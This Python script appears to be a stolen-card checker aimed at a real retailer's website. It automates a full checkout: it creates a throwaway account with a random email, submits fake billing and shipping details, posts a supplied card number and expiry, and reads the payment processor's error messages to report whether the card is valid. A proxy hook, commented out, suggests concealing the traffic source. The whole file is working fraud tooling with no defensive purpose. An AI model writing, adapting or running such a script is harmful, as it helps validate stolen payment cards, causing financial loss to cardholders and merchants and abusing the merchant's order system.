import requests,re,random,string
import asyncio
# from proxy import proxies

def getstr(text, start_delim, end_delim):
    start = text.find(start_delim)
    if start == -1:
        return None
    start += len(start_delim)
    end = text.find(end_delim, start)
    if end == -1:
        return None
    return text[start:end]

def generate_mail():
    user = ''.join(random.choices(string.ascii_lowercase + string.digits, k=(random.randint(5,15))))
    domain = random.choice(['@gmail.com', '@yahoo.com', '@hotmail.com', '@outlook.com', '@aol.com', '@protonmail.com'])
    return user + domain

async def B3_CCN(cc, mm, yy):
    email = generate_mail()
    r = requests.Session()
    # r.proxies = proxies()
    
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        # 'Cookie': '__utma=79525782.1899653827.1732612123.1732612123.1732612123.1; __utmc=79525782; __utmz=79525782.1732612123.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmt=1; __utmb=79525782.3.10.1732612123',
        'Pragma': 'no-cache',
        'Referer': 'https://www.surething.com/',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-site',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    params = {
        'sku': '30102-1',
        'qty': '1',
    }
    try:
        response = r.get('https://secure.surething.com/st/xt_cart_add.asp', params=params, headers=headers)
    except:
        return 'Error: 1st request failed'
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        # 'Cookie': '__utma=79525782.1899653827.1732612123.1732612123.1732612123.1; __utmc=79525782; __utmz=79525782.1732612123.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmt=1; __utmb=79525782.3.10.1732612123; ASPSESSIONIDCCBCTABR=ANACEJECFIMFPEODCCIGLHIB',
        'Pragma': 'no-cache',
        'Referer': 'https://www.surething.com/',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-site',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }
    try:
        response = r.get('https://secure.surething.com/st/Cart.asp', headers=headers)
    except:
        return 'Error: 2nd request failed'
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        # 'Cookie': '__utma=79525782.1899653827.1732612123.1732612123.1732612123.1; __utmc=79525782; __utmz=79525782.1732612123.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmt=1; __utmb=79525782.3.10.1732612123; ASPSESSIONIDCCBCTABR=ANACEJECFIMFPEODCCIGLHIB; __utma=133589132.1827983647.1732615544.1732615544.1732615544.1; __utmc=133589132; __utmz=133589132.1732615544.1.1.utmcsr=surething.com|utmccn=(referral)|utmcmd=referral|utmcct=/; __utmb=133589132.1.10.1732615544',
        'Pragma': 'no-cache',
        'Referer': 'https://secure.surething.com/st/Cart.asp',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }
    try:
        response = r.get('https://secure.surething.com/st/OrderInfo.asp', headers=headers)
    except:
        return 'Error: 3rd request failed'
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        # 'Cookie': '__utma=79525782.1899653827.1732612123.1732612123.1732612123.1; __utmc=79525782; __utmz=79525782.1732612123.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmt=1; __utmb=79525782.3.10.1732612123; ASPSESSIONIDCCBCTABR=ANACEJECFIMFPEODCCIGLHIB; __utma=133589132.1827983647.1732615544.1732615544.1732615544.1; __utmc=133589132; __utmz=133589132.1732615544.1.1.utmcsr=surething.com|utmccn=(referral)|utmcmd=referral|utmcct=/; __utmb=133589132.1.10.1732615544',
        'Pragma': 'no-cache',
        'Referer': 'https://secure.surething.com/st/Cart.asp',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    params = {
        'Redirect': 'OrderInfo.asp',
    }
    try:
        response = r.get('https://secure.surething.com/st/Login.asp', params=params, headers=headers)
    except:
        return 'Error: 4th request failed'
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        # 'Cookie': '__utma=79525782.1899653827.1732612123.1732612123.1732612123.1; __utmc=79525782; __utmz=79525782.1732612123.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmt=1; __utmb=79525782.3.10.1732612123; ASPSESSIONIDCCBCTABR=ANACEJECFIMFPEODCCIGLHIB; __utma=133589132.1827983647.1732615544.1732615544.1732615544.1; __utmc=133589132; __utmz=133589132.1732615544.1.1.utmcsr=surething.com|utmccn=(referral)|utmcmd=referral|utmcct=/; __utmb=133589132.3.10.1732615544',
        'Origin': 'https://secure.surething.com',
        'Pragma': 'no-cache',
        'Referer': 'https://secure.surething.com/st/NewAccount.asp?Redirect=OrderInfo.asp',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'redirect': 'OrderInfo.asp',
        'firstname': 'Albedo',
        'lastname': 'Jones',
        'email': email,
        'email2': email,
        'company': '',
        'password': 'Ayanpro@087',
        'password2': 'Ayanpro@087',
    }
    try:
        response = r.post('https://secure.surething.com/ST/xt_new_account.asp',  headers=headers, data=data)
    except:
        return 'Error: 6th request failed'
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        # 'Cookie': 'LabelGear=ShopperID=P21XUXXXWFE49MN7A8LHSKTFQAUJ9DC7; __utma=79525782.1899653827.1732612123.1732612123.1732612123.1; __utmc=79525782; __utmz=79525782.1732612123.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmt=1; __utmb=79525782.3.10.1732612123; ASPSESSIONIDCCBCTABR=ANACEJECFIMFPEODCCIGLHIB; __utma=133589132.1827983647.1732615544.1732615544.1732615544.1; __utmc=133589132; __utmz=133589132.1732615544.1.1.utmcsr=surething.com|utmccn=(referral)|utmcmd=referral|utmcct=/; __utmb=133589132.3.10.1732615544',
        'Pragma': 'no-cache',
        'Referer': 'https://secure.surething.com/st/NewAccount.asp?Redirect=OrderInfo.asp',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }
    try:
        response = r.get('https://secure.surething.com/ST/OrderInfo.asp',headers=headers)
    except:
        return 'Error: 7th request failed'
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        # 'Cookie': 'LabelGear=ShopperID=P21XUXXXWFE49MN7A8LHSKTFQAUJ9DC7; __utma=79525782.1899653827.1732612123.1732612123.1732612123.1; __utmc=79525782; __utmz=79525782.1732612123.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmb=79525782.3.10.1732612123; ASPSESSIONIDCCBCTABR=ANACEJECFIMFPEODCCIGLHIB; __utma=133589132.1827983647.1732615544.1732615544.1732615544.1; __utmc=133589132; __utmz=133589132.1732615544.1.1.utmcsr=surething.com|utmccn=(referral)|utmcmd=referral|utmcct=/; __utmb=133589132.4.10.1732615544',
        'Origin': 'https://secure.surething.com',
        'Pragma': 'no-cache',
        'Referer': 'https://secure.surething.com/ST/OrderInfo.asp',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'Billing_Name': 'Albedo Jones',
        'Billing_Company': '',
        'Billing_Street1': 'New York',
        'Billing_Street2': '',
        'Billing_City': 'New York',
        'Billing_State': 'NY',
        'Billing_Zip': '10080',
        'Billing_Country': 'US',
        'Billing_Phone': '8747747789',
        'Billing_Fax': '',
        'UseBillingForShipping': 'on',
        'Shipping_Name': 'Albedo Jones',
        'Shipping_Company': '',
        'Shipping_Street1': 'New York',
        'Shipping_Street2': '',
        'Shipping_City': 'New York',
        'Shipping_State': 'NY',
        'Shipping_Zip': '10080',
        'Shipping_Country': 'US',
        'Shipping_Phone': '8747747789',
        'Shipping_Fax': '',
    }
    try:
        response = r.post('https://secure.surething.com/ST/xt_order_info.asp', headers=headers, data=data)
    except:
        return 'Error: 5th request failed'
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        # 'Cookie': 'LabelGear=ShopperID=P21XUXXXWFE49MN7A8LHSKTFQAUJ9DC7; __utma=79525782.1899653827.1732612123.1732612123.1732612123.1; __utmc=79525782; __utmz=79525782.1732612123.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmb=79525782.3.10.1732612123; ASPSESSIONIDCCBCTABR=ANACEJECFIMFPEODCCIGLHIB; __utma=133589132.1827983647.1732615544.1732615544.1732615544.1; __utmc=133589132; __utmz=133589132.1732615544.1.1.utmcsr=surething.com|utmccn=(referral)|utmcmd=referral|utmcct=/; __utmb=133589132.4.10.1732615544',
        'Pragma': 'no-cache',
        'Referer': 'https://secure.surething.com/ST/OrderInfo.asp',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }
    try:
        response = r.get('https://secure.surething.com/ST/PaymentInfo.asp', headers=headers)
    except:
        return 'Error: 6th request failed'
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        # 'Cookie': 'LabelGear=ShopperID=P21XUXXXWFE49MN7A8LHSKTFQAUJ9DC7; __utma=79525782.1899653827.1732612123.1732612123.1732612123.1; __utmc=79525782; __utmz=79525782.1732612123.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmb=79525782.3.10.1732612123; ASPSESSIONIDCCBCTABR=ANACEJECFIMFPEODCCIGLHIB; __utma=133589132.1827983647.1732615544.1732615544.1732615544.1; __utmc=133589132; __utmz=133589132.1732615544.1.1.utmcsr=surething.com|utmccn=(referral)|utmcmd=referral|utmcct=/; __utmt=1; __utmb=133589132.5.10.1732615544',
        'Origin': 'https://secure.surething.com',
        'Pragma': 'no-cache',
        'Referer': 'https://secure.surething.com/ST/PaymentInfo.asp',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'ShipMethod': 'USPS_PFRPEnv',
        'DiscountCode': '',
        'CardType': '0',
        'CardNumber': cc,
        'CardName': 'Ayan',
        'ExpMonth': mm,
        'ExpYear': yy,
    }
    try:
        response = r.post('https://secure.surething.com/ST/xt_order_payment.asp', headers=headers, data=data)
    except:
        return 'Error: 7th request failed'
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        # 'Content-Length': '0',
        'Content-Type': 'application/x-www-form-urlencoded',
        # 'Cookie': 'LabelGear=ShopperID=P21XUXXXWFE49MN7A8LHSKTFQAUJ9DC7; __utma=79525782.1899653827.1732612123.1732612123.1732612123.1; __utmc=79525782; __utmz=79525782.1732612123.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmb=79525782.3.10.1732612123; ASPSESSIONIDCCBCTABR=ANACEJECFIMFPEODCCIGLHIB; __utma=133589132.1827983647.1732615544.1732615544.1732615544.1; __utmc=133589132; __utmz=133589132.1732615544.1.1.utmcsr=surething.com|utmccn=(referral)|utmcmd=referral|utmcct=/; __utmt=1; __utmb=133589132.6.10.1732615544',
        'Origin': 'https://secure.surething.com',
        'Pragma': 'no-cache',
        'Referer': 'https://secure.surething.com/ST/ConfirmOrder.asp',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }
    try:
        response = r.post('https://secure.surething.com/ST/xt_order_confirm.asp', headers=headers)
        try:
            error_messages = re.findall(r'<li>Error processing credit card: (.*?)</li>', response.text)
            merged_messages = " | ".join(error_messages)
            if error_messages:
            # Merge error messages with a separator
                merged_messages = " | ".join(error_messages)
                return merged_messages
            else:
                return 'Thank you for your order'
        except:
            return 'Thank you for your order'
    except:
        return 'Error: 11th request failed'
    
